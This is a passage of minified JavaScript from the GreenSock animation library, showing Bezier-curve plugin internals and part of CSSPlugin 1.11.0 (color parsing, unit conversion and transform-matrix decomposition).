            var s, r, a, o, h, l, _, u, p, f, c, m = {}, d = "cubic" === e ? 3 : 2, g = "soft" === e, v = [];
            if (g && i && (t = [i].concat(t)),
            null == t || d + 1 > t.length)
                throw "invalid Bezier data";
            for (p in t[0])
                v.push(p);
            for (l = v.length; --l > -1; ) {
                for (p = v[l],
                m[p] = h = [],
                f = 0,
                u = t.length,
                _ = 0; u > _; _++)
                    s = null == i ? t[_][p] : "string" == typeof (c = t[_][p]) && "=" === c.charAt(1) ? i[p] + Number(c.charAt(0) + c.substr(2)) : Number(c),
                    g && _ > 1 && u - 1 > _ && (h[f++] = (s + h[f - 2]) / 2),
                    h[f++] = s;
                for (u = f - d + 1,
                f = 0,
                _ = 0; u > _; _ += d)
                    s = h[_],
                    r = h[_ + 1],
                    a = h[_ + 2],
                    o = 2 === d ? 0 : h[_ + 3],
                    h[f++] = c = 3 === d ? new n(s,r,a,o) : new n(s,(2 * r + s) / 3,(2 * r + a) / 3,a);
                h.length = f
            }
            return m
        }
          , p = function(t, e, i) {
            for (var s, r, n, a, o, h, l, _, u, p, f, c = 1 / i, m = t.length; --m > -1; )
                for (p = t[m],
                n = p.a,
                a = p.d - n,
                o = p.c - n,
                h = p.b - n,
                s = r = 0,
                _ = 1; i >= _; _++)
                    l = c * _,
                    u = 1 - l,
                    s = r - (r = (l * l * a + 3 * u * (l * o + u * h)) * l),
                    f = m * i + _ - 1,
                    e[f] = (e[f] || 0) + s * s
        }
          , f = function(t, e) {
            e = e >> 0 || 6;
            var i, s, r, n, a = [], o = [], h = 0, l = 0, _ = e - 1, u = [], f = [];
            for (i in t)
                p(t[i], a, e);
            for (r = a.length,
            s = 0; r > s; s++)
                h += Math.sqrt(a[s]),
                n = s % e,
                f[n] = h,
                n === _ && (l += h,
                n = s / e >> 0,
                u[n] = f,
                o[n] = l,
                h = 0,
                f = []);
            return {
                length: l,
                lengths: o,
                segments: u
            }
        }
          , c = window._gsDefine.plugin({
            propName: "bezier",
            priority: -1,
            API: 2,
            global: !0,
            init: function(t, e, i) {
                this._target = t,
                e instanceof Array && (e = {
                    values: e
                }),
                this._func = {},
                this._round = {},
                this._props = [],
                this._timeRes = null == e.timeResolution ? 6 : parseInt(e.timeResolution, 10);
                var s, r, n, a, o, h = e.values || [], l = {}, p = h[0], c = e.autoRotate || i.vars.orientToBezier;
                this._autoRotate = c ? c instanceof Array ? c : [["x", "y", "rotation", c === !0 ? 0 : Number(c) || 0]] : null;
                for (s in p)
                    this._props.push(s);
                for (n = this._props.length; --n > -1; )
                    s = this._props[n],
                    this._overwriteProps.push(s),
                    r = this._func[s] = "function" == typeof t[s],
                    l[s] = r ? t[s.indexOf("set") || "function" != typeof t["get" + s.substr(3)] ? s : "get" + s.substr(3)]() : parseFloat(t[s]),
                    o || l[s] !== h[0][s] && (o = l);
                if (this._beziers = "cubic" !== e.type && "quadratic" !== e.type && "soft" !== e.type ? _(h, isNaN(e.curviness) ? 1 : e.curviness, !1, "thruBasic" === e.type, e.correlate, o) : u(h, e.type, l),
                this._segCount = this._beziers[s].length,
                this._timeRes) {
                    var m = f(this._beziers, this._timeRes);
                    this._length = m.length,
                    this._lengths = m.lengths,
                    this._segments = m.segments,
                    this._l1 = this._li = this._s1 = this._si = 0,
                    this._l2 = this._lengths[0],
                    this._curSeg = this._segments[0],
                    this._s2 = this._curSeg[0],
                    this._prec = 1 / this._curSeg.length
                }
                if (c = this._autoRotate)
                    for (c[0]instanceof Array || (this._autoRotate = c = [c]),
                    n = c.length; --n > -1; )
                        for (a = 0; 3 > a; a++)
                            s = c[n][a],
                            this._func[s] = "function" == typeof t[s] ? t[s.indexOf("set") || "function" != typeof t["get" + s.substr(3)] ? s : "get" + s.substr(3)] : !1;
                return !0
            },
            set: function(e) {
                var i, s, r, n, a, o, h, l, _, u, p = this._segCount, f = this._func, c = this._target;
                if (this._timeRes) {
                    if (_ = this._lengths,
                    u = this._curSeg,
                    e *= this._length,
                    r = this._li,
                    e > this._l2 && p - 1 > r) {
                        for (l = p - 1; l > r && e >= (this._l2 = _[++r]); )
                            ;
                        this._l1 = _[r - 1],
                        this._li = r,
                        this._curSeg = u = this._segments[r],
                        this._s2 = u[this._s1 = this._si = 0]
                    } else if (this._l1 > e && r > 0) {
                        for (; r > 0 && (this._l1 = _[--r]) >= e; )
                            ;
                        0 === r && this._l1 > e ? this._l1 = 0 : r++,
                        this._l2 = _[r],
                        this._li = r,
                        this._curSeg = u = this._segments[r],
                        this._s1 = u[(this._si = u.length - 1) - 1] || 0,
                        this._s2 = u[this._si]
                    }
                    if (i = r,
                    e -= this._l1,
                    r = this._si,
                    e > this._s2 && u.length - 1 > r) {
                        for (l = u.length - 1; l > r && e >= (this._s2 = u[++r]); )
                            ;
                        this._s1 = u[r - 1],
                        this._si = r
                    } else if (this._s1 > e && r > 0) {
                        for (; r > 0 && (this._s1 = u[--r]) >= e; )
                            ;
                        0 === r && this._s1 > e ? this._s1 = 0 : r++,
                        this._s2 = u[r],
                        this._si = r
                    }
                    o = (r + (e - this._s1) / (this._s2 - this._s1)) * this._prec
                } else
                    i = 0 > e ? 0 : e >= 1 ? p - 1 : p * e >> 0,
                    o = (e - i * (1 / p)) * p;
                for (s = 1 - o,
                r = this._props.length; --r > -1; )
                    n = this._props[r],
                    a = this._beziers[n][i],
                    h = (o * o * a.da + 3 * s * (o * a.ca + s * a.ba)) * o + a.a,
                    this._round[n] && (h = h + (h > 0 ? .5 : -.5) >> 0),
                    f[n] ? c[n](h) : c[n] = h;
                if (this._autoRotate) {
                    var m, d, g, v, y, T, w, x = this._autoRotate;
                    for (r = x.length; --r > -1; )
                        n = x[r][2],
                        T = x[r][3] || 0,
                        w = x[r][4] === !0 ? 1 : t,
                        a = this._beziers[x[r][0]],
                        m = this._beziers[x[r][1]],
                        a && m && (a = a[i],
                        m = m[i],
                        d = a.a + (a.b - a.a) * o,
                        v = a.b + (a.c - a.b) * o,
                        d += (v - d) * o,
                        v += (a.c + (a.d - a.c) * o - v) * o,
                        g = m.a + (m.b - m.a) * o,
                        y = m.b + (m.c - m.b) * o,
                        g += (y - g) * o,
                        y += (m.c + (m.d - m.c) * o - y) * o,
                        h = Math.atan2(y - g, v - d) * w + T,
                        f[n] ? c[n](h) : c[n] = h)
                }
            }
        })
          , m = c.prototype;
        c.bezierThrough = _,
        c.cubicToQuadratic = o,
        c._autoCSS = !0,
        c.quadraticToCubic = function(t, e, i) {
            return new n(t,(2 * e + t) / 3,(2 * e + i) / 3,i)
        }
        ,
        c._cssRegister = function() {
            var t = window._gsDefine.globals.CSSPlugin;
            if (t) {
                var e = t._internals
                  , i = e._parseToProxy
                  , s = e._setPluginRatio
                  , r = e.CSSPropTween;
                e._registerComplexSpecialProp("bezier", {
                    parser: function(t, e, n, a, o, h) {
                        e instanceof Array && (e = {
                            values: e
                        }),
                        h = new c;
                        var l, _, u, p = e.values, f = p.length - 1, m = [], d = {};
                        if (0 > f)
                            return o;
                        for (l = 0; f >= l; l++)
                            u = i(t, p[l], a, o, h, f !== l),
                            m[l] = u.end;
                        for (_ in e)
                            d[_] = e[_];
                        return d.values = m,
                        o = new r(t,"bezier",0,0,u.pt,2),
                        o.data = u,
                        o.plugin = h,
                        o.setRatio = s,
                        0 === d.autoRotate && (d.autoRotate = !0),
                        !d.autoRotate || d.autoRotate instanceof Array || (l = d.autoRotate === !0 ? 0 : Number(d.autoRotate),
                        d.autoRotate = null != u.end.left ? [["left", "top", "rotation", l, !1]] : null != u.end.x ? [["x", "y", "rotation", l, !1]] : !1),
                        d.autoRotate && (a._transform || a._enableTransforms(!1),
                        u.autoRotate = a._target._gsTransform),
                        h._onInitTween(u.proxy, d, a._tween),
                        o
                    }
                })
            }
        }
        ,
        m._roundProps = function(t, e) {
            for (var i = this._overwriteProps, s = i.length; --s > -1; )
                (t[i[s]] || t.bezier || t.bezierThrough) && (this._round[i[s]] = e)
        }
        ,
        m._kill = function(t) {
            var e, i, s = this._props;
            for (e in this._beziers)
                if (e in t)
                    for (delete this._beziers[e],
                    delete this._func[e],
                    i = s.length; --i > -1; )
                        s[i] === e && s.splice(i, 1);
            return this._super._kill.call(this, t)
        }
    }(),
    window._gsDefine("plugins.CSSPlugin", ["plugins.TweenPlugin", "TweenLite"], function(t, e) {
        var i, s, r, n, a = function() {
            t.call(this, "css"),
            this._overwriteProps.length = 0,
            this.setRatio = a.prototype.setRatio
        }, o = {}, h = a.prototype = new t("css");
        h.constructor = a,
        a.version = "1.11.0",
        a.API = 2,
        a.defaultTransformPerspective = 0,
        h = "px",
        a.suffixMap = {
            top: h,
            right: h,
            bottom: h,
            left: h,
            width: h,
            height: h,
            fontSize: h,
            padding: h,
            margin: h,
            perspective: h
        };
        var l, _, u, p, f, c, m = /(?:\d|\-\d|\.\d|\-\.\d)+/g, d = /(?:\d|\-\d|\.\d|\-\.\d|\+=\d|\-=\d|\+=.\d|\-=\.\d)+/g, g = /(?:\+=|\-=|\-|\b)[\d\-\.]+[a-zA-Z0-9]*(?:%|\b)/gi, v = /[^\d\-\.]/g, y = /(?:\d|\-|\+|=|#|\.)*/g, T = /opacity *= *([^)]*)/, w = /opacity:([^;]*)/, x = /alpha\(opacity *=.+?\)/i, b = /^(rgb|hsl)/, P = /([A-Z])/g, S = /-([a-z])/gi, k = /(^(?:url\(\"|url\())|(?:(\"\))$|\)$)/gi, R = function(t, e) {
            return e.toUpperCase()
        }, A = /(?:Left|Right|Width)/i, C = /(M11|M12|M21|M22)=[\d\-\.e]+/gi, O = /progid\:DXImageTransform\.Microsoft\.Matrix\(.+?\)/i, D = /,(?=[^\)]*(?:\(|$))/gi, M = Math.PI / 180, I = 180 / Math.PI, F = {}, E = document, N = E.createElement("div"), L = E.createElement("img"), X = a._internals = {
            _specialProps: o
        }, z = navigator.userAgent, U = function() {
            var t, e = z.indexOf("Android"), i = E.createElement("div");
            return u = -1 !== z.indexOf("Safari") && -1 === z.indexOf("Chrome") && (-1 === e || Number(z.substr(e + 8, 1)) > 3),
            f = u && 6 > Number(z.substr(z.indexOf("Version/") + 8, 1)),
            p = -1 !== z.indexOf("Firefox"),
            /MSIE ([0-9]{1,}[\.0-9]{0,})/.exec(z),
            c = parseFloat(RegExp.$1),
            i.innerHTML = "<a style='top:1px;opacity:.55;'>a</a>",
            t = i.getElementsByTagName("a")[0],
            t ? /^0.55/.test(t.style.opacity) : !1
        }(), Y = function(t) {
            return T.test("string" == typeof t ? t : (t.currentStyle ? t.currentStyle.filter : t.style.filter) || "") ? parseFloat(RegExp.$1) / 100 : 1
        }, j = function(t) {
            window.console && console.log(t)
        }, B = "", q = "", V = function(t, e) {
            e = e || N;
            var i, s, r = e.style;
            if (void 0 !== r[t])
                return t;
            for (t = t.charAt(0).toUpperCase() + t.substr(1),
            i = ["O", "Moz", "ms", "Ms", "Webkit"],
            s = 5; --s > -1 && void 0 === r[i[s] + t]; )
                ;
            return s >= 0 ? (q = 3 === s ? "ms" : i[s],
            B = "-" + q.toLowerCase() + "-",
            q + t) : null
        }, Z = E.defaultView ? E.defaultView.getComputedStyle : function() {}
        , G = a.getStyle = function(t, e, i, s, r) {
            var n;
            return U || "opacity" !== e ? (!s && t.style[e] ? n = t.style[e] : (i = i || Z(t, null)) ? (t = i.getPropertyValue(e.replace(P, "-$1").toLowerCase()),
            n = t || i.length ? t : i[e]) : t.currentStyle && (n = t.currentStyle[e]),
            null == r || n && "none" !== n && "auto" !== n && "auto auto" !== n ? n : r) : Y(t)
        }
        , $ = function(t, e, i, s, r) {
            if ("px" === s || !s)
                return i;
            if ("auto" === s || !i)
                return 0;
            var n, a = A.test(e), o = t, h = N.style, l = 0 > i;
            return l && (i = -i),
            "%" === s && -1 !== e.indexOf("border") ? n = i / 100 * (a ? t.clientWidth : t.clientHeight) : (h.cssText = "border-style:solid;border-width:0;position:absolute;line-height:0;",
            "%" !== s && o.appendChild ? h[a ? "borderLeftWidth" : "borderTopWidth"] = i + s : (o = t.parentNode || E.body,
            h[a ? "width" : "height"] = i + s),
            o.appendChild(N),
            n = parseFloat(N[a ? "offsetWidth" : "offsetHeight"]),
            o.removeChild(N),
            0 !== n || r || (n = $(t, e, i, s, !0))),
            l ? -n : n
        }, Q = function(t, e, i) {
            if ("absolute" !== G(t, "position", i))
                return 0;
            var s = "left" === e ? "Left" : "Top"
              , r = G(t, "margin" + s, i);
            return t["offset" + s] - ($(t, e, parseFloat(r), r.replace(y, "")) || 0)
        }, W = function(t, e) {
            var i, s, r = {};
            if (e = e || Z(t, null))
                if (i = e.length)
                    for (; --i > -1; )
                        r[e[i].replace(S, R)] = e.getPropertyValue(e[i]);
                else
                    for (i in e)
                        r[i] = e[i];
            else if (e = t.currentStyle || t.style)
                for (i in e)
                    "string" == typeof i && void 0 !== r[i] && (r[i.replace(S, R)] = e[i]);
            return U || (r.opacity = Y(t)),
            s = be(t, e, !1),
            r.rotation = s.rotation,
            r.skewX = s.skewX,
            r.scaleX = s.scaleX,
            r.scaleY = s.scaleY,
            r.x = s.x,
            r.y = s.y,
            xe && (r.z = s.z,
            r.rotationX = s.rotationX,
            r.rotationY = s.rotationY,
            r.scaleZ = s.scaleZ),
            r.filters && delete r.filters,
            r
        }, H = function(t, e, i, s, r) {
            var n, a, o, h = {}, l = t.style;
            for (a in i)
                "cssText" !== a && "length" !== a && isNaN(a) && (e[a] !== (n = i[a]) || r && r[a]) && -1 === a.indexOf("Origin") && ("number" == typeof n || "string" == typeof n) && (h[a] = "auto" !== n || "left" !== a && "top" !== a ? "" !== n && "auto" !== n && "none" !== n || "string" != typeof e[a] || "" === e[a].replace(v, "") ? n : 0 : Q(t, a),
                void 0 !== l[a] && (o = new ue(l,a,l[a],o)));
            if (s)
                for (a in s)
                    "className" !== a && (h[a] = s[a]);
            return {
                difs: h,
                firstMPT: o
            }
        }, K = {
            width: ["Left", "Right"],
            height: ["Top", "Bottom"]
        }, J = ["marginLeft", "marginRight", "marginTop", "marginBottom"], te = function(t, e, i) {
            var s = parseFloat("width" === e ? t.offsetWidth : t.offsetHeight)
              , r = K[e]
              , n = r.length;
            for (i = i || Z(t, null); --n > -1; )
                s -= parseFloat(G(t, "padding" + r[n], i, !0)) || 0,
                s -= parseFloat(G(t, "border" + r[n] + "Width", i, !0)) || 0;
            return s
        }, ee = function(t, e) {
            (null == t || "" === t || "auto" === t || "auto auto" === t) && (t = "0 0");
            var i = t.split(" ")
              , s = -1 !== t.indexOf("left") ? "0%" : -1 !== t.indexOf("right") ? "100%" : i[0]
              , r = -1 !== t.indexOf("top") ? "0%" : -1 !== t.indexOf("bottom") ? "100%" : i[1];
            return null == r ? r = "0" : "center" === r && (r = "50%"),
            ("center" === s || isNaN(parseFloat(s)) && -1 === (s + "").indexOf("=")) && (s = "50%"),
            e && (e.oxp = -1 !== s.indexOf("%"),
            e.oyp = -1 !== r.indexOf("%"),
            e.oxr = "=" === s.charAt(1),
            e.oyr = "=" === r.charAt(1),
            e.ox = parseFloat(s.replace(v, "")),
            e.oy = parseFloat(r.replace(v, ""))),
            s + " " + r + (i.length > 2 ? " " + i[2] : "")
        }, ie = function(t, e) {
            return "string" == typeof t && "=" === t.charAt(1) ? parseInt(t.charAt(0) + "1", 10) * parseFloat(t.substr(2)) : parseFloat(t) - parseFloat(e)
        }, se = function(t, e) {
            return null == t ? e : "string" == typeof t && "=" === t.charAt(1) ? parseInt(t.charAt(0) + "1", 10) * Number(t.substr(2)) + e : parseFloat(t)
        }, re = function(t, e, i, s) {
            var r, n, a, o, h = 1e-6;
            return null == t ? o = e : "number" == typeof t ? o = t : (r = 360,
            n = t.split("_"),
            a = Number(n[0].replace(v, "")) * (-1 === t.indexOf("rad") ? 1 : I) - ("=" === t.charAt(1) ? 0 : e),
            n.length && (s && (s[i] = e + a),
            -1 !== t.indexOf("short") && (a %= r,
            a !== a % (r / 2) && (a = 0 > a ? a + r : a - r)),
            -1 !== t.indexOf("_cw") && 0 > a ? a = (a + 9999999999 * r) % r - (0 | a / r) * r : -1 !== t.indexOf("ccw") && a > 0 && (a = (a - 9999999999 * r) % r - (0 | a / r) * r)),
            o = e + a),
            h > o && o > -h && (o = 0),
            o
        }, ne = {
            aqua: [0, 255, 255],
            lime: [0, 255, 0],
            silver: [192, 192, 192],
            black: [0, 0, 0],
            maroon: [128, 0, 0],
            teal: [0, 128, 128],
            blue: [0, 0, 255],
            navy: [0, 0, 128],
            white: [255, 255, 255],
            fuchsia: [255, 0, 255],
            olive: [128, 128, 0],
            yellow: [255, 255, 0],
            orange: [255, 165, 0],
            gray: [128, 128, 128],
            purple: [128, 0, 128],
            green: [0, 128, 0],
            red: [255, 0, 0],
            pink: [255, 192, 203],
            cyan: [0, 255, 255],
            transparent: [255, 255, 255, 0]
        }, ae = function(t, e, i) {
            return t = 0 > t ? t + 1 : t > 1 ? t - 1 : t,
            0 | 255 * (1 > 6 * t ? e + 6 * (i - e) * t : .5 > t ? i : 2 > 3 * t ? e + 6 * (i - e) * (2 / 3 - t) : e) + .5
        }, oe = function(t) {
            var e, i, s, r, n, a;
            return t && "" !== t ? "number" == typeof t ? [t >> 16, 255 & t >> 8, 255 & t] : ("," === t.charAt(t.length - 1) && (t = t.substr(0, t.length - 1)),
            ne[t] ? ne[t] : "#" === t.charAt(0) ? (4 === t.length && (e = t.charAt(1),
            i = t.charAt(2),
            s = t.charAt(3),
            t = "#" + e + e + i + i + s + s),
            t = parseInt(t.substr(1), 16),
            [t >> 16, 255 & t >> 8, 255 & t]) : "hsl" === t.substr(0, 3) ? (t = t.match(m),
            r = Number(t[0]) % 360 / 360,
            n = Number(t[1]) / 100,
            a = Number(t[2]) / 100,
            i = .5 >= a ? a * (n + 1) : a + n - a * n,
            e = 2 * a - i,
            t.length > 3 && (t[3] = Number(t[3])),
            t[0] = ae(r + 1 / 3, e, i),
            t[1] = ae(r, e, i),
            t[2] = ae(r - 1 / 3, e, i),
            t) : (t = t.match(m) || ne.transparent,
            t[0] = Number(t[0]),
            t[1] = Number(t[1]),
            t[2] = Number(t[2]),
            t.length > 3 && (t[3] = Number(t[3])),
            t)) : ne.black
        }, he = "(?:\\b(?:(?:rgb|rgba|hsl|hsla)\\(.+?\\))|\\B#.+?\\b";
        for (h in ne)
            he += "|" + h + "\\b";
        he = RegExp(he + ")", "gi");
        var le = function(t, e, i, s) {
            if (null == t)
                return function(t) {
                    return t
                }
                ;
            var r, n = e ? (t.match(he) || [""])[0] : "", a = t.split(n).join("").match(g) || [], o = t.substr(0, t.indexOf(a[0])), h = ")" === t.charAt(t.length - 1) ? ")" : "", l = -1 !== t.indexOf(" ") ? " " : ",", _ = a.length, u = _ > 0 ? a[0].replace(m, "") : "";
            return _ ? r = e ? function(t) {
                var e, p, f, c;
                if ("number" == typeof t)
                    t += u;
                else if (s && D.test(t)) {
                    for (c = t.replace(D, "|").split("|"),
                    f = 0; c.length > f; f++)
                        c[f] = r(c[f]);
                    return c.join(",")
                }
                if (e = (t.match(he) || [n])[0],
                p = t.split(e).join("").match(g) || [],
                f = p.length,
                _ > f--)
                    for (; _ > ++f; )
                        p[f] = i ? p[0 | (f - 1) / 2] : a[f];
                return o + p.join(l) + l + e + h + (-1 !== t.indexOf("inset") ? " inset" : "")
            }
            : function(t) {
                var e, n, p;
                if ("number" == typeof t)
                    t += u;
                else if (s && D.test(t)) {
                    for (n = t.replace(D, "|").split("|"),
                    p = 0; n.length > p; p++)
                        n[p] = r(n[p]);
                    return n.join(",")
                }
                if (e = t.match(g) || [],
                p = e.length,
                _ > p--)
                    for (; _ > ++p; )
                        e[p] = i ? e[0 | (p - 1) / 2] : a[p];
                return o + e.join(l) + h
            }
            : function(t) {
                return t
            }
        }
          , _e = function(t) {
            return t = t.split(","),
            function(e, i, s, r, n, a, o) {
                var h, l = (i + "").split(" ");
                for (o = {},
                h = 0; 4 > h; h++)
                    o[t[h]] = l[h] = l[h] || l[(h - 1) / 2 >> 0];
                return r.parse(e, o, n, a)
            }
        }
          , ue = (X._setPluginRatio = function(t) {
            this.plugin.setRatio(t);
            for (var e, i, s, r, n = this.data, a = n.proxy, o = n.firstMPT, h = 1e-6; o; )
                e = a[o.v],
                o.r ? e = e > 0 ? 0 | e + .5 : 0 | e - .5 : h > e && e > -h && (e = 0),
                o.t[o.p] = e,
                o = o._next;
            if (n.autoRotate && (n.autoRotate.rotation = a.rotation),
            1 === t)
                for (o = n.firstMPT; o; ) {
                    if (i = o.t,
                    i.type) {
                        if (1 === i.type) {
                            for (r = i.xs0 + i.s + i.xs1,
                            s = 1; i.l > s; s++)
                                r += i["xn" + s] + i["xs" + (s + 1)];
                            i.e = r
                        }
                    } else
                        i.e = i.s + i.xs0;
                    o = o._next
                }
        }
        ,
        function(t, e, i, s, r) {
            this.t = t,
            this.p = e,
            this.v = i,
            this.r = r,
            s && (s._prev = this,
            this._next = s)
        }
        )
          , pe = (X._parseToProxy = function(t, e, i, s, r, n) {
            var a, o, h, l, _, u = s, p = {}, f = {}, c = i._transform, m = F;
            for (i._transform = null,
            F = e,
            s = _ = i.parse(t, e, s, r),
            F = m,
            n && (i._transform = c,
            u && (u._prev = null,
            u._prev && (u._prev._next = null))); s && s !== u; ) {
                if (1 >= s.type && (o = s.p,
                f[o] = s.s + s.c,
                p[o] = s.s,
                n || (l = new ue(s,"s",o,l,s.r),
                s.c = 0),
                1 === s.type))
                    for (a = s.l; --a > 0; )
                        h = "xn" + a,
                        o = s.p + "_" + h,
                        f[o] = s.data[h],
                        p[o] = s[h],
                        n || (l = new ue(s,h,o,l,s.rxp[h]));
                s = s._next
            }
            return {
                proxy: p,
                end: f,
                firstMPT: l,
                pt: _
            }
        }
        ,
        X.CSSPropTween = function(t, e, s, r, a, o, h, l, _, u, p) {
            this.t = t,
            this.p = e,
            this.s = s,
            this.c = r,
            this.n = h || e,
            t instanceof pe || n.push(this.n),
            this.r = l,
            this.type = o || 0,
            _ && (this.pr = _,
            i = !0),
            this.b = void 0 === u ? s : u,
            this.e = void 0 === p ? s + r : p,
            a && (this._next = a,
            a._prev = this)
        }
        )
          , fe = a.parseComplex = function(t, e, i, s, r, n, a, o, h, _) {
            i = i || n || "",
            a = new pe(t,e,0,0,a,_ ? 2 : 1,null,!1,o,i,s),
            s += "";
            var u, p, f, c, g, v, y, T, w, x, P, S, k = i.split(", ").join(",").split(" "), R = s.split(", ").join(",").split(" "), A = k.length, C = l !== !1;
            for ((-1 !== s.indexOf(",") || -1 !== i.indexOf(",")) && (k = k.join(" ").replace(D, ", ").split(" "),
            R = R.join(" ").replace(D, ", ").split(" "),
            A = k.length),
            A !== R.length && (k = (n || "").split(" "),
            A = k.length),
            a.plugin = h,
            a.setRatio = _,
            u = 0; A > u; u++)
                if (c = k[u],
                g = R[u],
                T = parseFloat(c),
                T || 0 === T)
                    a.appendXtra("", T, ie(g, T), g.replace(d, ""), C && -1 !== g.indexOf("px"), !0);
                else if (r && ("#" === c.charAt(0) || ne[c] || b.test(c)))
                    S = "," === g.charAt(g.length - 1) ? ")," : ")",
                    c = oe(c),
                    g = oe(g),
                    w = c.length + g.length > 6,
                    w && !U && 0 === g[3] ? (a["xs" + a.l] += a.l ? " transparent" : "transparent",
                    a.e = a.e.split(R[u]).join("transparent")) : (U || (w = !1),
                    a.appendXtra(w ? "rgba(" : "rgb(", c[0], g[0] - c[0], ",", !0, !0).appendXtra("", c[1], g[1] - c[1], ",", !0).appendXtra("", c[2], g[2] - c[2], w ? "," : S, !0),
                    w && (c = 4 > c.length ? 1 : c[3],
                    a.appendXtra("", c, (4 > g.length ? 1 : g[3]) - c, S, !1)));
                else if (v = c.match(m)) {
                    if (y = g.match(d),
                    !y || y.length !== v.length)
                        return a;
                    for (f = 0,
                    p = 0; v.length > p; p++)
                        P = v[p],
                        x = c.indexOf(P, f),
                        a.appendXtra(c.substr(f, x - f), Number(P), ie(y[p], P), "", C && "px" === c.substr(x + P.length, 2), 0 === p),
                        f = x + P.length;
                    a["xs" + a.l] += c.substr(f)
                } else
                    a["xs" + a.l] += a.l ? " " + c : c;
            if (-1 !== s.indexOf("=") && a.data) {
                for (S = a.xs0 + a.data.s,
                u = 1; a.l > u; u++)
                    S += a["xs" + u] + a.data["xn" + u];
                a.e = S + a["xs" + u]
            }
            return a.l || (a.type = -1,
            a.xs0 = a.e),
            a.xfirst || a
        }
          , ce = 9;
        for (h = pe.prototype,
        h.l = h.pr = 0; --ce > 0; )
            h["xn" + ce] = 0,
            h["xs" + ce] = "";
        h.xs0 = "",
        h._next = h._prev = h.xfirst = h.data = h.plugin = h.setRatio = h.rxp = null,
        h.appendXtra = function(t, e, i, s, r, n) {
            var a = this
              , o = a.l;
            return a["xs" + o] += n && o ? " " + t : t || "",
            i || 0 === o || a.plugin ? (a.l++,
            a.type = a.setRatio ? 2 : 1,
            a["xs" + a.l] = s || "",
            o > 0 ? (a.data["xn" + o] = e + i,
            a.rxp["xn" + o] = r,
            a["xn" + o] = e,
            a.plugin || (a.xfirst = new pe(a,"xn" + o,e,i,a.xfirst || a,0,a.n,r,a.pr),
            a.xfirst.xs0 = 0),
            a) : (a.data = {
                s: e + i
            },
            a.rxp = {},
            a.s = e,
            a.c = i,
            a.r = r,
            a)) : (a["xs" + o] += e + (s || ""),
            a)
        }
        ;
        var me = function(t, e) {
            e = e || {},
            this.p = e.prefix ? V(t) || t : t,
            o[t] = o[this.p] = this,
            this.format = e.formatter || le(e.defaultValue, e.color, e.collapsible, e.multi),
            e.parser && (this.parse = e.parser),
            this.clrs = e.color,
            this.multi = e.multi,
            this.keyword = e.keyword,
            this.dflt = e.defaultValue,
            this.pr = e.priority || 0
        }
          , de = X._registerComplexSpecialProp = function(t, e, i) {
            "object" != typeof e && (e = {
                parser: i
            });
            var s, r, n = t.split(","), a = e.defaultValue;
            for (i = i || [a],
            s = 0; n.length > s; s++)
                e.prefix = 0 === s && e.prefix,
                e.defaultValue = i[s] || a,
                r = new me(n[s],e)
        }
          , ge = function(t) {
            if (!o[t]) {
                var e = t.charAt(0).toUpperCase() + t.substr(1) + "Plugin";
                de(t, {
                    parser: function(t, i, s, r, n, a, h) {
                        var l = (window.GreenSockGlobals || window).com.greensock.plugins[e];
                        return l ? (l._cssRegister(),
                        o[s].parse(t, i, s, r, n, a, h)) : (j("Error: " + e + " js file not loaded."),
                        n)
                    }
                })
            }
        };
        h = me.prototype,
        h.parseComplex = function(t, e, i, s, r, n) {
            var a, o, h, l, _, u, p = this.keyword;
            if (this.multi && (D.test(i) || D.test(e) ? (o = e.replace(D, "|").split("|"),
            h = i.replace(D, "|").split("|")) : p && (o = [e],
            h = [i])),
            h) {
                for (l = h.length > o.length ? h.length : o.length,
                a = 0; l > a; a++)
                    e = o[a] = o[a] || this.dflt,
                    i = h[a] = h[a] || this.dflt,
                    p && (_ = e.indexOf(p),
                    u = i.indexOf(p),
                    _ !== u && (i = -1 === u ? h : o,
                    i[a] += " " + p));
                e = o.join(", "),
                i = h.join(", ")
            }
            return fe(t, this.p, e, i, this.clrs, this.dflt, s, this.pr, r, n)
        }
        ,
        h.parse = function(t, e, i, s, n, a) {
            return this.parseComplex(t.style, this.format(G(t, this.p, r, !1, this.dflt)), this.format(e), n, a)
        }
        ,
        a.registerSpecialProp = function(t, e, i) {
            de(t, {
                parser: function(t, s, r, n, a, o) {
                    var h = new pe(t,r,0,0,a,2,r,!1,i);
                    return h.plugin = o,
                    h.setRatio = e(t, s, n._tween, r),
                    h
                },
                priority: i
            })
        }
        ;
        var ve = "scaleX,scaleY,scaleZ,x,y,z,skewX,rotation,rotationX,rotationY,perspective".split(",")
          , ye = V("transform")
          , Te = B + "transform"
          , we = V("transformOrigin")
          , xe = null !== V("perspective")
          , be = function(t, e, i, s) {
            if (t._gsTransform && i && !s)
                return t._gsTransform;
            var r, n, o, h, l, _, u, p, f, c, m, d, g, v = i ? t._gsTransform || {
                skewY: 0
            } : {
                skewY: 0
            }, y = 0 > v.scaleX, T = 2e-5, w = 1e5, x = 179.99, b = x * M, P = xe ? parseFloat(G(t, we, e, !1, "0 0 0").split(" ")[2]) || v.zOrigin || 0 : 0;
            for (ye ? r = G(t, Te, e, !0) : t.currentStyle && (r = t.currentStyle.filter.match(C),
            r = r && 4 === r.length ? [r[0].substr(4), Number(r[2].substr(4)), Number(r[1].substr(4)), r[3].substr(4), v.x || 0, v.y || 0].join(",") : ""),
            n = (r || "").match(/(?:\-|\b)[\d\-\.e]+\b/gi) || [],
            o = n.length; --o > -1; )
                h = Number(n[o]),
                n[o] = (l = h - (h |= 0)) ? (0 | l * w + (0 > l ? -.5 : .5)) / w + h : h;
            if (16 === n.length) {
                var S = n[8]
                  , k = n[9]
                  , R = n[10]
                  , A = n[12]
                  , O = n[13]
                  , D = n[14];
                if (v.zOrigin && (D = -v.zOrigin,
                A = S * D - n[12],
                O = k * D - n[13],
                D = R * D + v.zOrigin - n[14]),
                !i || s || null == v.rotationX) {
                    var F, E, N, L, X, z, U, Y = n[0], j = n[1], B = n[2], q = n[3], V = n[4], Z = n[5], $ = n[6], Q = n[7], W = n[11], H = Math.atan2($, R), K = -b > H || H > b;
                    v.rotationX = H * I,
                    H && (L = Math.cos(-H),
                    X = Math.sin(-H),
                    F = V * L + S * X,
                    E = Z * L + k * X,
                    N = $ * L + R * X,
                    S = V * -X + S * L,
                    k = Z * -X + k * L,
                    R = $ * -X + R * L,
                    W = Q * -X + W * L,
                    V = F,
                    Z = E,
                    $ = N),
                    H = Math.atan2(S, Y),
                    v.rotationY = H * I,
                    H && (z = -b > H || H > b,
                    L = Math.cos(-H),
                    X = Math.sin(-H),
                    F = Y * L - S * X,
                    E = j * L - k * X,
                    N = B * L - R * X,
                    k = j * X + k * L,
                    R = B * X + R * L,
                    W = q * X + W * L,
